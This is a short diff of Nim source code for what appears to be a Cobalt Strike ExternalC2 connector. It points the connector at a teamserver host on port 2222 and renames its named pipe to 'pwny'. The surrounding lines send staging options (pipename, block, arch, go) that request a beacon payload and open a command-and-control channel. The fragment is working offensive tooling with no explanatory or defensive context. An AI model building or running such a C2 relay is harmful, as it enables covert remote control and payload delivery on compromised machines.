@@ -28,7 +28,7 @@ proc CSrecv(sock: Socket): (int,string) =
 
 
 let externalc2: Socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_IP)
-externalc2.connect("127.0.0.1", Port(2222))
+externalc2.connect("teamserver.local", Port(2222))
 stdout.writeLine("Connected To CS ExternalC2 at PORT 2222")
 
 
@@ -40,7 +40,7 @@ controllerC2.listen()
 
 
 
-CSsend(externalc2,"pipename=bobstart")
+CSsend(externalc2,"pipename=pwny")
 CSsend(externalc2,"block=100")
 CSsend(externalc2,"arch=x64")
 CSsend(externalc2,"go")
